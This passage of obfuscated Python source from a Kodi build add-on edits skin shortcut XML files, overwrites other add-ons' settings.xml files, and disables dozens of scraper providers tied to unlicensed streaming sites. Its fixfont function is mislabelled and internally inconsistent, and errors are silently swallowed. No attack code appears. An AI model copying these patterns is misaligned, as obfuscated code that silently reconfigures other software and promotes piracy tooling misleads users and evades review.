    OOO000O00OO0OO0OO =OOO000O00OO0OO0OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1235
    with open (OOO00OOOO0OOOOOOO ,'w')as OO000000O000OOOOO :#line:1238
      OO000000O000OOOOO .write (OOO000O00OO0OO0OO )#line:1239
    OOO00OOOO0OOOOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1243
    with open (OOO00OOOO0OOOOOOO ,'r')as OO000000O000OOOOO :#line:1244
      OOO000O00OO0OO0OO =OO000000O000OOOOO .read ()#line:1245
    OOO000O00OO0OO0OO =OOO000O00OO0OO0OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1263
    with open (OOO00OOOO0OOOOOOO ,'w')as OO000000O000OOOOO :#line:1266
      OO000000O000OOOOO .write (OOO000O00OO0OO0OO )#line:1267
    OOO00OOOO0OOOOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1271
    with open (OOO00OOOO0OOOOOOO ,'r')as OO000000O000OOOOO :#line:1272
      OOO000O00OO0OO0OO =OO000000O000OOOOO .read ()#line:1273
    OOO000O00OO0OO0OO =OOO000O00OO0OO0OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1291
    with open (OOO00OOOO0OOOOOOO ,'w')as OO000000O000OOOOO :#line:1294
      OO000000O000OOOOO .write (OOO000O00OO0OO0OO )#line:1295
    OOO00OOOO0OOOOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1298
    with open (OOO00OOOO0OOOOOOO ,'r')as OO000000O000OOOOO :#line:1299
      OOO000O00OO0OO0OO =OO000000O000OOOOO .read ()#line:1300
    OOO000O00OO0OO0OO =OOO000O00OO0OO0OO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1318
    with open (OOO00OOOO0OOOOOOO ,'w')as OO000000O000OOOOO :#line:1321
      OO000000O000OOOOO .write (OOO000O00OO0OO0OO )#line:1322
    OOO00OOOO0OOOOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1324
    with open (OOO00OOOO0OOOOOOO ,'r')as OO000000O000OOOOO :#line:1325
      OOO000O00OO0OO0OO =OO000000O000OOOOO .read ()#line:1326
    OOO000O00OO0OO0OO =OOO000O00OO0OO0OO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1344
    with open (OOO00OOOO0OOOOOOO ,'w')as OO000000O000OOOOO :#line:1347
      OO000000O000OOOOO .write (OOO000O00OO0OO0OO )#line:1348
    OOO00OOOO0OOOOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1350
    with open (OOO00OOOO0OOOOOOO ,'r')as OO000000O000OOOOO :#line:1351
      OOO000O00OO0OO0OO =OO000000O000OOOOO .read ()#line:1352
    OOO000O00OO0OO0OO =OOO000O00OO0OO0OO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1370
    with open (OOO00OOOO0OOOOOOO ,'w')as OO000000O000OOOOO :#line:1373
      OO000000O000OOOOO .write (OOO000O00OO0OO0OO )#line:1374
    OOO00OOOO0OOOOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1377
    with open (OOO00OOOO0OOOOOOO ,'r')as OO000000O000OOOOO :#line:1378
      OOO000O00OO0OO0OO =OO000000O000OOOOO .read ()#line:1379
    OOO000O00OO0OO0OO =OOO000O00OO0OO0OO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1397
    with open (OOO00OOOO0OOOOOOO ,'w')as OO000000O000OOOOO :#line:1400
      OO000000O000OOOOO .write (OOO000O00OO0OO0OO )#line:1401
def rdbuildinstallON ():#line:1404
    try :#line:1406
       OOO0O0O0OO0OOO000 =ADDONPATH +"/resources/rd/victory.xml"#line:1407
       O0O0O00OOO0OOO00O =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1408
       copyfile (OOO0O0O0OO0OOO000 ,O0O0O00OOO0OOO00O )#line:1410
       OOO0O0O0OO0OOO000 =ADDONPATH +"/resources/rd/exodusredux.xml"#line:1412
       O0O0O00OOO0OOO00O =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1413
       copyfile (OOO0O0O0OO0OOO000 ,O0O0O00OOO0OOO00O )#line:1415
       OOO0O0O0OO0OOO000 =ADDONPATH +"/resources/rd/openscrapers.xml"#line:1417
       O0O0O00OOO0OOO00O =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1418
       copyfile (OOO0O0O0OO0OOO000 ,O0O0O00OOO0OOO00O )#line:1420
       OOO0O0O0OO0OOO000 =ADDONPATH +"/resources/rd/Splash.png"#line:1423
       O0O0O00OOO0OOO00O =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1424
       copyfile (OOO0O0O0OO0OOO000 ,O0O0O00OOO0OOO00O )#line:1426
    except :#line:1428
       pass #line:1429
def rdbuild ():#line:1439
	O0O00O00000O0O0O0 =(ADDON .getSetting ("auto_rd"))#line:1440
	if O0O00O00000O0O0O0 =='true':#line:1441
		O0000OO00OO0OO000 =xbmcaddon .Addon ('plugin.video.allmoviesin')#line:1442
		O0000OO00OO0OO000 .setSetting ('all_t','0')#line:1443
		O0000OO00OO0OO000 .setSetting ('rd_menu_enable','false')#line:1444
		O0000OO00OO0OO000 .setSetting ('magnet_bay','false')#line:1445
		O0000OO00OO0OO000 .setSetting ('magnet_extra','false')#line:1446
		O0000OO00OO0OO000 .setSetting ('rd_only','false')#line:1447
		O0000OO00OO0OO000 .setSetting ('ftp','false')#line:1449
		O0000OO00OO0OO000 .setSetting ('fp','false')#line:1450
		O0000OO00OO0OO000 .setSetting ('filter_fp','false')#line:1451
		O0000OO00OO0OO000 .setSetting ('fp_size_en','false')#line:1452
		O0000OO00OO0OO000 .setSetting ('afdah','false')#line:1453
		O0000OO00OO0OO000 .setSetting ('ap2s','false')#line:1454
		O0000OO00OO0OO000 .setSetting ('cin','false')#line:1455
		O0000OO00OO0OO000 .setSetting ('clv','false')#line:1456
		O0000OO00OO0OO000 .setSetting ('cmv','false')#line:1457
		O0000OO00OO0OO000 .setSetting ('dl20','false')#line:1458
		O0000OO00OO0OO000 .setSetting ('esc','false')#line:1459
		O0000OO00OO0OO000 .setSetting ('extra','false')#line:1460
		O0000OO00OO0OO000 .setSetting ('film','false')#line:1461
		O0000OO00OO0OO000 .setSetting ('fre','false')#line:1462
		O0000OO00OO0OO000 .setSetting ('fxy','false')#line:1463
		O0000OO00OO0OO000 .setSetting ('genv','false')#line:1464
		O0000OO00OO0OO000 .setSetting ('getgo','false')#line:1465
		O0000OO00OO0OO000 .setSetting ('gold','false')#line:1466
		O0000OO00OO0OO000 .setSetting ('gona','false')#line:1467
		O0000OO00OO0OO000 .setSetting ('hdmm','false')#line:1468
		O0000OO00OO0OO000 .setSetting ('hdt','false')#line:1469
		O0000OO00OO0OO000 .setSetting ('icy','false')#line:1470
		O0000OO00OO0OO000 .setSetting ('ind','false')#line:1471
		O0000OO00OO0OO000 .setSetting ('iwi','false')#line:1472
		O0000OO00OO0OO000 .setSetting ('jen_free','false')#line:1473
		O0000OO00OO0OO000 .setSetting ('kiss','false')#line:1474
		O0000OO00OO0OO000 .setSetting ('lavin','false')#line:1475
		O0000OO00OO0OO000 .setSetting ('los','false')#line:1476
		O0000OO00OO0OO000 .setSetting ('m4u','false')#line:1477
		O0000OO00OO0OO000 .setSetting ('mesh','false')#line:1478
		O0000OO00OO0OO000 .setSetting ('mf','false')#line:1479
		O0000OO00OO0OO000 .setSetting ('mkvc','false')#line:1480
		O0000OO00OO0OO000 .setSetting ('mjy','false')#line:1481
		O0000OO00OO0OO000 .setSetting ('hdonline','false')#line:1482
		O0000OO00OO0OO000 .setSetting ('moviex','false')#line:1483
		O0000OO00OO0OO000 .setSetting ('mpr','false')#line:1484
		O0000OO00OO0OO000 .setSetting ('mvg','false')#line:1485
		O0000OO00OO0OO000 .setSetting ('mvl','false')#line:1486
		O0000OO00OO0OO000 .setSetting ('mvs','false')#line:1487
		O0000OO00OO0OO000 .setSetting ('myeg','false')#line:1488
		O0000OO00OO0OO000 .setSetting ('ninja','false')#line:1489
		O0000OO00OO0OO000 .setSetting ('odb','false')#line:1490
		O0000OO00OO0OO000 .setSetting ('ophd','false')#line:1491
		O0000OO00OO0OO000 .setSetting ('pks','false')#line:1492
		O0000OO00OO0OO000 .setSetting ('prf','false')#line:1493
		O0000OO00OO0OO000 .setSetting ('put18','false')#line:1494
		O0000OO00OO0OO000 .setSetting ('req','false')#line:1495
		O0000OO00OO0OO000 .setSetting ('rftv','false')#line:1496
		O0000OO00OO0OO000 .setSetting ('rltv','false')#line:1497
		O0000OO00OO0OO000 .setSetting ('sc','false')#line:1498
		O0000OO00OO0OO000 .setSetting ('seehd','false')#line:1499
		O0000OO00OO0OO000 .setSetting ('showbox','false')#line:1500
		O0000OO00OO0OO000 .setSetting ('shuid','false')#line:1501
		O0000OO00OO0OO000 .setSetting ('sil_gh','false')#line:1502
		O0000OO00OO0OO000 .setSetting ('spv','false')#line:1503
		O0000OO00OO0OO000 .setSetting ('subs','false')#line:1504
		O0000OO00OO0OO000 .setSetting ('tvs','false')#line:1505
		O0000OO00OO0OO000 .setSetting ('tw','false')#line:1506
		O0000OO00OO0OO000 .setSetting ('upto','false')#line:1507
		O0000OO00OO0OO000 .setSetting ('vel','false')#line:1508
		O0000OO00OO0OO000 .setSetting ('vex','false')#line:1509
		O0000OO00OO0OO000 .setSetting ('vidc','false')#line:1510
		O0000OO00OO0OO000 .setSetting ('w4hd','false')#line:1511
		O0000OO00OO0OO000 .setSetting ('wav','false')#line:1512
		O0000OO00OO0OO000 .setSetting ('wf','false')#line:1513
		O0000OO00OO0OO000 .setSetting ('wse','false')#line:1514
		O0000OO00OO0OO000 .setSetting ('wss','false')#line:1515
		O0000OO00OO0OO000 .setSetting ('wsse','false')#line:1516
		O0000OO00OO0OO000 =xbmcaddon .Addon ('plugin.video.speedmax')#line:1517
		O0000OO00OO0OO000 .setSetting ('debrid.only','true')#line:1518
		O0000OO00OO0OO000 .setSetting ('hosts.captcha','false')#line:1519
		O0000OO00OO0OO000 =xbmcaddon .Addon ('script.module.civitasscrapers')#line:1520
		O0000OO00OO0OO000 .setSetting ('provider.123moviehd','false')#line:1521
		O0000OO00OO0OO000 .setSetting ('provider.300mbdownload','false')#line:1522
		O0000OO00OO0OO000 .setSetting ('provider.alltube','false')#line:1523
		O0000OO00OO0OO000 .setSetting ('provider.allucde','false')#line:1524
		O0000OO00OO0OO000 .setSetting ('provider.animebase','false')#line:1525
		O0000OO00OO0OO000 .setSetting ('provider.animeloads','false')#line:1526
		O0000OO00OO0OO000 .setSetting ('provider.animetoon','false')#line:1527
		O0000OO00OO0OO000 .setSetting ('provider.bnwmovies','false')#line:1528
		O0000OO00OO0OO000 .setSetting ('provider.boxfilm','false')#line:1529
		O0000OO00OO0OO000 .setSetting ('provider.bs','false')#line:1530
		O0000OO00OO0OO000 .setSetting ('provider.cartoonhd','false')#line:1531
		O0000OO00OO0OO000 .setSetting ('provider.cdahd','false')#line:1532
		O0000OO00OO0OO000 .setSetting ('provider.cdax','false')#line:1533
		O0000OO00OO0OO000 .setSetting ('provider.cine','false')#line:1534
		O0000OO00OO0OO000 .setSetting ('provider.cinenator','false')#line:1535
		O0000OO00OO0OO000 .setSetting ('provider.cmovieshdbz','false')#line:1536
		O0000OO00OO0OO000 .setSetting ('provider.coolmoviezone','false')#line:1537
		O0000OO00OO0OO000 .setSetting ('provider.ddl','false')#line:1538
		O0000OO00OO0OO000 .setSetting ('provider.deepmovie','false')#line:1539
		O0000OO00OO0OO000 .setSetting ('provider.ekinomaniak','false')#line:1540
		O0000OO00OO0OO000 .setSetting ('provider.ekinotv','false')#line:1541
		O0000OO00OO0OO000 .setSetting ('provider.filiser','false')#line:1542
		O0000OO00OO0OO000 .setSetting ('provider.filmpalast','false')#line:1543
		O0000OO00OO0OO000 .setSetting ('provider.filmwebbooster','false')#line:1544
		O0000OO00OO0OO000 .setSetting ('provider.filmxy','false')#line:1545
		O0000OO00OO0OO000 .setSetting ('provider.fmovies','false')#line:1546
		O0000OO00OO0OO000 .setSetting ('provider.foxx','false')#line:1547
		O0000OO00OO0OO000 .setSetting ('provider.freefmovies','false')#line:1548
		O0000OO00OO0OO000 .setSetting ('provider.freeputlocker','false')#line:1549
		O0000OO00OO0OO000 .setSetting ('provider.furk','false')#line:1550
		O0000OO00OO0OO000 .setSetting ('provider.gamatotv','false')#line:1551
		O0000OO00OO0OO000 .setSetting ('provider.gogoanime','false')#line:1552
		O0000OO00OO0OO000 .setSetting ('provider.gowatchseries','false')#line:1553
		O0000OO00OO0OO000 .setSetting ('provider.hackimdb','false')#line:1554
		O0000OO00OO0OO000 .setSetting ('provider.hdfilme','false')#line:1555
		O0000OO00OO0OO000 .setSetting ('provider.hdmto','false')#line:1556
		O0000OO00OO0OO000 .setSetting ('provider.hdpopcorns','false')#line:1557
		O0000OO00OO0OO000 .setSetting ('provider.hdstreams','false')#line:1558
		O0000OO00OO0OO000 .setSetting ('provider.horrorkino','false')#line:1560
		O0000OO00OO0OO000 .setSetting ('provider.iitv','false')#line:1561
		O0000OO00OO0OO000 .setSetting ('provider.iload','false')#line:1562
		O0000OO00OO0OO000 .setSetting ('provider.iwaatch','false')#line:1563
		O0000OO00OO0OO000 .setSetting ('provider.kinodogs','false')#line:1564
		O0000OO00OO0OO000 .setSetting ('provider.kinoking','false')#line:1565
		O0000OO00OO0OO000 .setSetting ('provider.kinow','false')#line:1566
		O0000OO00OO0OO000 .setSetting ('provider.kinox','false')#line:1567
		O0000OO00OO0OO000 .setSetting ('provider.lichtspielhaus','false')#line:1568
		O0000OO00OO0OO000 .setSetting ('provider.liomenoi','false')#line:1569
		O0000OO00OO0OO000 .setSetting ('provider.magnetdl','false')#line:1572
		O0000OO00OO0OO000 .setSetting ('provider.megapelistv','false')#line:1573
		O0000OO00OO0OO000 .setSetting ('provider.movie2k-ac','false')#line:1574
		O0000OO00OO0OO000 .setSetting ('provider.movie2k-ag','false')#line:1575
		O0000OO00OO0OO000 .setSetting ('provider.movie2z','false')#line:1576
		O0000OO00OO0OO000 .setSetting ('provider.movie4k','false')#line:1577
		O0000OO00OO0OO000 .setSetting ('provider.movie4kis','false')#line:1578
		O0000OO00OO0OO000 .setSetting ('provider.movieneo','false')#line:1579
		O0000OO00OO0OO000 .setSetting ('provider.moviesever','false')#line:1580
		O0000OO00OO0OO000 .setSetting ('provider.movietown','false')#line:1581
		O0000OO00OO0OO000 .setSetting ('provider.mvrls','false')#line:1583
		O0000OO00OO0OO000 .setSetting ('provider.netzkino','false')#line:1584
		O0000OO00OO0OO000 .setSetting ('provider.odb','false')#line:1585
		O0000OO00OO0OO000 .setSetting ('provider.openkatalog','false')#line:1586
		O0000OO00OO0OO000 .setSetting ('provider.ororo','false')#line:1587
		O0000OO00OO0OO000 .setSetting ('provider.paczamy','false')#line:1588
		O0000OO00OO0OO000 .setSetting ('provider.peliculasdk','false')#line:1589
		O0000OO00OO0OO000 .setSetting ('provider.pelisplustv','false')#line:1590
		O0000OO00OO0OO000 .setSetting ('provider.pepecine','false')#line:1591
		O0000OO00OO0OO000 .setSetting ('provider.primewire','false')#line:1592
		O0000OO00OO0OO000 .setSetting ('provider.projectfreetv','false')#line:1593
		O0000OO00OO0OO000 .setSetting ('provider.proxer','false')#line:1594
		O0000OO00OO0OO000 .setSetting ('provider.pureanime','false')#line:1595
		O0000OO00OO0OO000 .setSetting ('provider.putlocker','false')#line:1596
		O0000OO00OO0OO000 .setSetting ('provider.putlockerfree','false')#line:1597
		O0000OO00OO0OO000 .setSetting ('provider.reddit','false')#line:1598
		O0000OO00OO0OO000 .setSetting ('provider.cartoonwire','false')#line:1599
		O0000OO00OO0OO000 .setSetting ('provider.seehd','false')#line:1600
		O0000OO00OO0OO000 .setSetting ('provider.segos','false')#line:1601
		O0000OO00OO0OO000 .setSetting ('provider.serienstream','false')#line:1602
		O0000OO00OO0OO000 .setSetting ('provider.series9','false')#line:1603
		O0000OO00OO0OO000 .setSetting ('provider.seriesever','false')#line:1604
		O0000OO00OO0OO000 .setSetting ('provider.seriesonline','false')#line:1605
		O0000OO00OO0OO000 .setSetting ('provider.seriespapaya','false')#line:1606
		O0000OO00OO0OO000 .setSetting ('provider.sezonlukdizi','false')#line:1607
		O0000OO00OO0OO000 .setSetting ('provider.solarmovie','false')#line:1608
		O0000OO00OO0OO000 .setSetting ('provider.solarmoviez','false')#line:1609
		O0000OO00OO0OO000 .setSetting ('provider.stream-to','false')#line:1610
		O0000OO00OO0OO000 .setSetting ('provider.streamdream','false')#line:1611
		O0000OO00OO0OO000 .setSetting ('provider.streamflix','false')#line:1612
		O0000OO00OO0OO000 .setSetting ('provider.streamit','false')#line:1613
		O0000OO00OO0OO000 .setSetting ('provider.swatchseries','false')#line:1614
		O0000OO00OO0OO000 .setSetting ('provider.szukajkatv','false')#line:1615
		O0000OO00OO0OO000 .setSetting ('provider.tainiesonline','false')#line:1616
		O0000OO00OO0OO000 .setSetting ('provider.tainiomania','false')#line:1617
		O0000OO00OO0OO000 .setSetting ('provider.tata','false')#line:1620
		O0000OO00OO0OO000 .setSetting ('provider.trt','false')#line:1621
		O0000OO00OO0OO000 .setSetting ('provider.tvbox','false')#line:1622
		O0000OO00OO0OO000 .setSetting ('provider.ultrahd','false')#line:1623
		O0000OO00OO0OO000 .setSetting ('provider.video4k','false')#line:1624
		O0000OO00OO0OO000 .setSetting ('provider.vidics','false')#line:1625
		O0000OO00OO0OO000 .setSetting ('provider.view4u','false')#line:1626
		O0000OO00OO0OO000 .setSetting ('provider.watchseries','false')#line:1627
		O0000OO00OO0OO000 .setSetting ('provider.xrysoi','false')#line:1628
		O0000OO00OO0OO000 .setSetting ('provider.library','false')#line:1629
def fixfont ():#line:1632
	O00O00000OO0OO00O =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.GetSettings","id":1}')#line:1633
	OOOOO00O000O00OOO =json .loads (O00O00000OO0OO00O );#line:1635
	OO0OOO0O0O00O0OOO =OOOOO00O000O00OOO ["result"]["settings"]#line:1636
	OO00O0OOOO0O0O000 =[OOOOOO0OOO000O0O0 for OOOOOO0OOO000O0O0 in OO0OOO0O0O00O0OOO if OOOOOO0OOO000O0O0 ["id"]=="audiooutput.audiodevice"][0 ]#line:1638
	O00O0000000O0OO0O =OO00O0OOOO0O0O000 ["options"];#line:1639
	OO00O00000OO0OOO0 =OO00O0OOOO0O0O000 ["value"];#line:1640
	OO0O0OOOO0O0O0O00 =[O00OOOOOO00OOOOO0 for (O00OOOOOO00OOOOO0 ,OOOO00O0000OO0O00 )in enumerate (O00O0000000O0OO0O )if OOOO00O0000OO0O00 ["value"]==OO00O00000OO0OOO0 ][0 ];#line:1642
	OOO0O000O0O00O0OO =(OO0O0OOOO0O0O0O00 +1 )%len (O00O0000000O0OO0O )#line:1644
	O000OOOOO0OOOO00O =O00O0000000O0OO0O [OOO0O000O0O00O0OO ]["value"]#line:1646
	OO0OO0OOOOO0000OO =O00O0000000O0OO0O [OOO0O000O0O00O0OO ]["label"]#line:1647
	O0O0000O0OO00O0OO =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","params":{"setting":"subtitles.height","value":40},"id":1}')#line:1649
	try :#line:1651
		OOOOOO0O0O000OO00 =json .loads (O0O0000O0OO00O0OO );#line:1652
		if OOOOOO0O0O000OO00 ["result"]!=True :#line:1654
			raise Exception #line:1655
	except :#line:1656
		sys .stderr .write ("Error switching audio output device")#line:1657
		raise Exception #line:1658
def parseDOM2 (O00O000OOO00OOOO0 ,name =u"",attrs ={},ret =False ):#line:1659
	if isinstance (O00O000OOO00OOOO0 ,str ):#line:1662
		try :#line:1663
			O00O000OOO00OOOO0 =[O00O000OOO00OOOO0 .decode ("utf-8")]#line:1664
		except :#line:1665
			O00O000OOO00OOOO0 =[O00O000OOO00OOOO0 ]#line:1666
	elif isinstance (O00O000OOO00OOOO0 ,unicode ):#line:1667
		O00O000OOO00OOOO0 =[O00O000OOO00OOOO0 ]#line:1668
	elif not isinstance (O00O000OOO00OOOO0 ,list ):#line:1669
		return u""#line:1670
	if not name .strip ():#line:1672
		return u""#line:1673
	OO0OOOO0O0OO0000O =[]#line:1675
	for O0OOO0OOOOOOO0OO0 in O00O000OOO00OOOO0 :#line:1676
		O0OOO00OOOOO0O00O =re .compile ('(<[^>]*?\n[^>]*?>)').findall (O0OOO0OOOOOOO0OO0 )#line:1677
		for OOO0O0OO00O000000 in O0OOO00OOOOO0O00O :#line:1678
			O0OOO0OOOOOOO0OO0 =O0OOO0OOOOOOO0OO0 .replace (OOO0O0OO00O000000 ,OOO0O0OO00O000000 .replace ("\n"," "))#line:1679
		OO0OOO00OO0OO00OO =[]#line:1681
		for OOO0000OOO0O000OO in attrs :#line:1682
			OO00O00OO0O000O00 =re .compile ('(<'+name +'[^>]*?(?:'+OOO0000OOO0O000OO +'=[\'"]'+attrs [OOO0000OOO0O000OO ]+'[\'"].*?>))',re .M |re .S ).findall (O0OOO0OOOOOOO0OO0 )#line:1683
			if len (OO00O00OO0O000O00 )==0 and attrs [OOO0000OOO0O000OO ].find (" ")==-1 :#line:1684
				OO00O00OO0O000O00 =re .compile ('(<'+name +'[^>]*?(?:'+OOO0000OOO0O000OO +'='+attrs [OOO0000OOO0O000OO ]+'.*?>))',re .M |re .S ).findall (O0OOO0OOOOOOO0OO0 )#line:1685
			if len (OO0OOO00OO0OO00OO )==0 :#line:1687
				OO0OOO00OO0OO00OO =OO00O00OO0O000O00 #line:1688
				OO00O00OO0O000O00 =[]#line:1689
			else :#line:1690
				O000O0000O0O0OO00 =range (len (OO0OOO00OO0OO00OO ))#line:1691
				O000O0000O0O0OO00 .reverse ()#line:1692
				for O00O0OO0O0O0O0OO0 in O000O0000O0O0OO00 :#line:1693
					if not OO0OOO00OO0OO00OO [O00O0OO0O0O0O0OO0 ]in OO00O00OO0O000O00 :#line:1694
						del (OO0OOO00OO0OO00OO [O00O0OO0O0O0O0OO0 ])#line:1695
		if len (OO0OOO00OO0OO00OO )==0 and attrs =={}:#line:1697
			OO0OOO00OO0OO00OO =re .compile ('(<'+name +'>)',re .M |re .S ).findall (O0OOO0OOOOOOO0OO0 )#line:1698
			if len (OO0OOO00OO0OO00OO )==0 :#line:1699
				OO0OOO00OO0OO00OO =re .compile ('(<'+name +' .*?>)',re .M |re .S ).findall (O0OOO0OOOOOOO0OO0 )#line:1700
		if isinstance (ret ,str ):#line:1702
			OO00O00OO0O000O00 =[]#line:1703
			for OOO0O0OO00O000000 in OO0OOO00OO0OO00OO :#line:1704
				O0O0O0O00OO000OOO =re .compile ('<'+name +'.*?'+ret +'=([\'"].[^>]*?[\'"])>',re .M |re .S ).findall (OOO0O0OO00O000000 )#line:1705
				if len (O0O0O0O00OO000OOO )==0 :#line:1706
					O0O0O0O00OO000OOO =re .compile ('<'+name +'.*?'+ret +'=(.[^>]*?)>',re .M |re .S ).findall (OOO0O0OO00O000000 )#line:1707
				for O000O0O000O0O00OO in O0O0O0O00OO000OOO :#line:1708
					O0000OOOO0O0OO00O =O000O0O000O0O00OO [0 ]#line:1709
					if O0000OOOO0O0OO00O in "'\"":#line:1710
						if O000O0O000O0O00OO .find ('='+O0000OOOO0O0OO00O ,O000O0O000O0O00OO .find (O0000OOOO0O0OO00O ,1 ))>-1 :#line:1711
							O000O0O000O0O00OO =O000O0O000O0O00OO [:O000O0O000O0O00OO .find ('='+O0000OOOO0O0OO00O ,O000O0O000O0O00OO .find (O0000OOOO0O0OO00O ,1 ))]#line:1712
						if O000O0O000O0O00OO .rfind (O0000OOOO0O0OO00O ,1 )>-1 :#line:1714
							O000O0O000O0O00OO =O000O0O000O0O00OO [1 :O000O0O000O0O00OO .rfind (O0000OOOO0O0OO00O )]#line:1715
					else :#line:1716
						if O000O0O000O0O00OO .find (" ")>0 :#line:1717
							O000O0O000O0O00OO =O000O0O000O0O00OO [:O000O0O000O0O00OO .find (" ")]#line:1718
						elif O000O0O000O0O00OO .find ("/")>0 :#line:1719
							O000O0O000O0O00OO =O000O0O000O0O00OO [:O000O0O000O0O00OO .find ("/")]#line:1720
						elif O000O0O000O0O00OO .find (">")>0 :#line:1721
							O000O0O000O0O00OO =O000O0O000O0O00OO [:O000O0O000O0O00OO .find (">")]#line:1722
					OO00O00OO0O000O00 .append (O000O0O000O0O00OO .strip ())#line:1724
			OO0OOO00OO0OO00OO =OO00O00OO0O000O00 #line:1725
		else :#line:1726
			OO00O00OO0O000O00 =[]#line:1727
			for OOO0O0OO00O000000 in OO0OOO00OO0OO00OO :#line:1728
				OO00O0OO0O00OO0OO =u"</"+name #line:1729
				OO00O0OOO00OO00O0 =O0OOO0OOOOOOO0OO0 .find (OOO0O0OO00O000000 )#line:1731
